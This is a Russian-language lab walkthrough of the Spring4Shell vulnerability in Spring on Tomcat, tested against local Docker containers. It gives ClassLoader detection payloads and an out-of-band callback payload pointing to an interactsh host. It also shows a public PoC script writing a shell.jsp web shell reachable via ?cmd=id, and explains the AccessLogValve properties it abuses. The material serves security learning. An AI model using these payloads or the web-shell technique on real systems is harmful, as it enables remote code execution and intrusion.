#Spring4shell

## Подготовка

Для практики и демонстрации необходимо скачать следующий docker image:

```bash
docker pull rajasoun/spring4shell-tomcat
```

и запустить его:

```bash
docker run -p 8080:8080 --rm --interactive --tty --name spring4shell rajasoun/spring4shell-tomcat:latest
```

>[!INFO]
>Spring Framework - это просто [контейнер внедрения зависимостей](https://en.wikipedia.org/wiki/Dependency_injection), с несколькими удобными слоями (например: доступ к базе данных, прокси, аспектно-ориентированное программирование, RPC, веб-инфраструктура MVC). Это все позволяет вам быстрее и удобнее создавать Java-приложения.

Далее открываем запущенное приложение по следующему адресу:

>[!CITE] Url
>```url
>http://127.0.0.1:8080/spring4shell/
>```

![[Снимок экрана 2022-11-29 в 22.16.31.png]]

Следующим шагом станет запуск ZAP и настройка BOAST сервера.

![[2022-11-30 14.29.19.gif]]
[[Запись экрана 2022-11-29 в 22.27.23.mov|Ролик в формате mov]]

Необходимо проверить, что все работает, для этого требуется перейти по следующей ссылке:

>[!CITE] URL
>```url
>http://fjnfbx2im5fkrcjuawryvrybt4.odiss.eu
>```

 В браузере появиться ключ BOAST сервера, а ZAP уведомление об успешном соединении.

![[2022-11-30 14.35.02 1.gif]]
[[Запись экрана 2022-11-29 в 22.31.31.mov|Ролик в формате mov]]

Так же вместо BOAST сервера ZAP можно использовать приложение **interactsh-client** https://github.com/projectdiscovery/interactsh.

Для работы потребуется установить `GO`.

Запускаем клиент:

```bash
./interactsh-client
```

```bash
	_       __                       __       __  
   (_)___  / /____  _________ ______/ /______/ /_ 
  / / __ \/ __/ _ \/ ___/ __ '/ ___/ __/ ___/ __ \
 / / / / / /_/  __/ /  / /_/ / /__/ /_(__  ) / / /
/_/_/ /_/\__/\___/_/   \__,_/\___/\__/____/_/ /_/ 1.0.7

				projectdiscovery.io

[WRN] Use with caution. You are responsible for your actions
[WRN] Developers assume no liability and are not responsible for any misuse or damage.
[INF] Listing 1 payload for OOB Testing
[INF] ce3ri5292d3k1u455350wzdwb87soff85.oast.online
[]
```

Для проверки функционирования переходим по следующему адресу:

>[!CITE] URL
>```url
>http://ce3ri5292d3k1u455350wzdwb87soff85.oast.online
>```

![[Снимок экрана 2022-11-30 в 23.16.48.png]]

И в `interactsh` видим соединение:

```bash
	_       __                       __       __  
   (_)___  / /____  _________ ______/ /______/ /_ 
  / / __ \/ __/ _ \/ ___/ __ '/ ___/ __/ ___/ __ \
 / / / / / /_/  __/ /  / /_/ / /__/ /_(__  ) / / /
/_/_/ /_/\__/\___/_/   \__,_/\___/\__/____/_/ /_/ 1.0.7

				projectdiscovery.io

[WRN] Use with caution. You are responsible for your actions
[WRN] Developers assume no liability and are not responsible for any misuse or damage.
[INF] Listing 1 payload for OOB Testing
[INF] ce3ri5292d3k1u455350wzdwb87soff85.oast.online
[ce3ri5292d3k1u455350wzdwb87soff85] Received DNS interaction () from 193.105.59.6 at 2022-11-30 20:16:12
[ce3ri5292d3k1u455350wzdwb87soff85] Received DNS interaction (A) from 193.105.59.6 at 2022-11-30 20:16:12
[ce3ri5292d3k1u455350wzdwb87soff85] Received DNS interaction () from 172.217.37.140 at 2022-11-30 20:16:13
[ce3ri5292d3k1u455350wzdwb87soff85] Received DNS interaction () from 173.194.98.9 at 2022-11-30 20:16:13
[ce3ri5292d3k1u455350wzdwb87soff85] Received DNS interaction () from 193.105.59.2 at 2022-11-30 20:16:13
[ce3ri5292d3k1u455350wzdwb87soff85] Received HTTP interaction from 91.219.188.237 at 2022-11-30 20:16:13
[ce3ri5292d3k1u455350wzdwb87soff85] Received HTTP interaction from 91.219.188.237 at 2022-11-30 20:16:13
[ce3ri5292d3k1u455350wzdwb87soff85] Received HTTP interaction from 91.219.188.237 at 2022-11-30 20:16:16
[]
```

## Полезная нагрузка №1 (ZAP)


Для проверки уязвим сервис или нет, необходимо использовать следующую безопасную полезную нагрузку (ZAP):

>[!EXAMPLE]
>```url
>/?class.module.classLoader.DefaultAssertionStatus=nonsense
>```

![[Снимок экрана 2022-11-29 в 22.39.20.png]]

Результатом того, что сервис **"~~возможно~~"** уязвим является ответ 400.

>[!NOTE]
Также и другие ответы об ошибке могут свидетельствовать о том, что сервис уязвим (например 500).


>[!FAQ] Как это работает?
>
Когда Spring Framework анализирует параметры, после получения ClassLoader он вызывает переменную DefaultAssertionStatus, которая имеет некорректный параметр (так как это логическая/булеанная переменная) и выводит ошибку сигнализирующую о существовании уязвимости.

Допускается использование следующих вариантов полезной нагрузки:

>[!EXAMPLE]
>```url
?class.module.classLoader.DefaultAssertionStatus=nonsense
>```
> или
>```url
&class.module.classLoader.DefaultAssertionStatus=nonsense
>```

## Полезная нагрузка №2 (Microsoft)

>[!EXAMPLE]
>```url
>?class.module.classLoader.URLs%5B0%5D=0
>```
> или
>```url
>/?class.module.classLoader.URLs%5B0%5D=0
>```
> или
>```url
>&class.module.classLoader.URLs%5B0%5D=0
>```

>[!FAQ] Как это работает?
>
Практически также как и в предыдущем примере, за исключением того, что в вызываемом методе getUrls устанавливаем значение urls[0] = 0, но поскольку тип массива URL-адресов является URL-адресом, установка 0 вызовет исключение несоответствия типа и приведет к ошибке.

## Полезная нагрузка №3 (nuclei-templates)

Для более надежного определения, что сервис действительно уязвим используется следующая полезная нагрузка:

>[!EXAMPLE]
>```url
>/?class.module.classLoader.resources.context.configFile=http://"OAST"&class.module.classLoader.resources.context.configFile.content.aaa=xxx
>```

Данную нагрузку необходимо отправить с POST запросом и получить 200 ответ.

![[2022-11-30 14.29.42.gif]]
[[Запись экрана 2022-11-29 в 22.46.54.mov|Ролик в формате mov]]

>[!FAQ] Как это работает?
>
>Вызвав публичный интерфейс resources.context, он предоставляет доступ к экземплярам классов ресурсов и далее с помощью configFile устанавливает адрес обращения. Но если все оставить как есть вызова не произойдет, необходимо повторно вызвать загрузчик (class.module.classLoader) и с помощью congfigFile.content со значением content.aaa=xxx вызвать исключение, что позволит congfigFile.content  вызвать метод getContent который делает URL запрос к BOATS серверу.

>[!FAQ] Почему же это возможно?
>
Дело в AccessLogValve.
>
Работа перечисленных полезных нагрузок обрабатывается с использованием **WebappClassLoaderBase**, что приводит к обращению к классу **AccessLogValve**.
>
>```java
>User.getClass()
>  java.lang.Class.getModule()
>    java.lang.Module.getClassLoader()
>      org.apache.catalina.loader.ParallelWebappClassLoader.getResources()
>        org.apache.catalina.webresources.StandardRoot.getContext()
>          org.apache.catalina.core.StandardContext.getParent()
>            org.apache.catalina.core.StandardHost.getPipeline()
>              org.apache.catalina.core.StandardPipeline.getFirst()
>                org.apache.catalina.valves.AccessLogValve.setPattern()
>```

**AccessLogValve** позволяет настроить логгер для редактирования или создания файла в корневом окружении **Apache Tomcat** и созданный файл становится доступен для прямых вызовов.

>[!WARNING] Важно
>Первые две полезные нагрузки по сообщениям сообщества могут часто давать **false possitive** срабатывания, поэтому необходимо делать проверку с помощью полезной нагрузки №3.

## Полезная нагрузка №4 (git PoC)

Клонируем репозиторий https://github.com/reznok/Spring4Shell-POC

Собираем контейнер:

```bash
docker build . -t spring4shell && docker run -p 8080:8080 spring4shell
```

И открываем по следующему адресу:

>[!CITE] URL
```url
http://localhost:8080/helloworld/greeting
```

![[Снимок экрана 2022-12-01 в 00.24.20.png]]

Следующая нагрузка с помощью **ClassLoader** перезаписывает критические свойства функций ведения журнала, чтобы создать веб-оболочку (web-shell):

![[Снимок экрана 2022-12-01 в 00.20.40.png]]

Запускаем скрипт:

>[!EXAMPLE]
>```bash
>python3 exploit.py --url http://localhost:8080/helloworld/greeting
>```

```bash
pavelserebryakov@MacBook-Pro Spring4Shell-POC-master % python3 exploit.py --url http://localhost:8080/helloworld/greeting        
[*] Resetting Log Variables.
[*] Response code: 200
[*] Modifying Log Configurations
[*] Response code: 200
[*] Response Code: 200
[*] Resetting Log Variables.
[*] Response code: 200
[+] Exploit completed
[+] Check your target for a shell
[+] File: shell.jsp
[+] Shell should be at: http://localhost:8080/shell.jsp?cmd=id
```

И переходим по следующему адресу:

>[!CITE] URL
>```url
>http://localhost:8080/shell.jsp?cmd=id
>```

![[Снимок экрана 2022-12-01 в 00.33.56.png]]

>[!FAQ] Как это работает?
>
>- **1** Определяет содержимое файла журнала.
>```java
>class.module.classLoader.resources.context.parent.pipeline.first.pattern
>```
>- **2** Префикс ссылается на имя журнала. Тут необходимо дать название файлу веб-оболочки.
>```java
>class.module.classLoader.resources.context.parent.pipeline.first.prefix
>```
>- **3** Суффикс указывает на расширение файла журнала (**.jsp**).
>```java
>class.module.classLoader.resources.context.parent.pipeline.first.suffix
>```
>- **4** Свойство `directory` определяет местоположение файла журнала. Если корневой каталог удаленно доступен, можно использовать `webapps/ROOT` в качестве значения свойства `directory` и необходимо иметь возможность взаимодействовать с загружаемой веб-оболочкой перейдя по `/.jsp`.
>```java
>class.module.classLoader.resources.context.parent.pipeline.first.directory
>```
>- **5** Необязательная функция, но сделает "жизнь" немного проще - удаляя временные метки из ответов, если оставить свойство пустым.
>```java
>class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat
>```

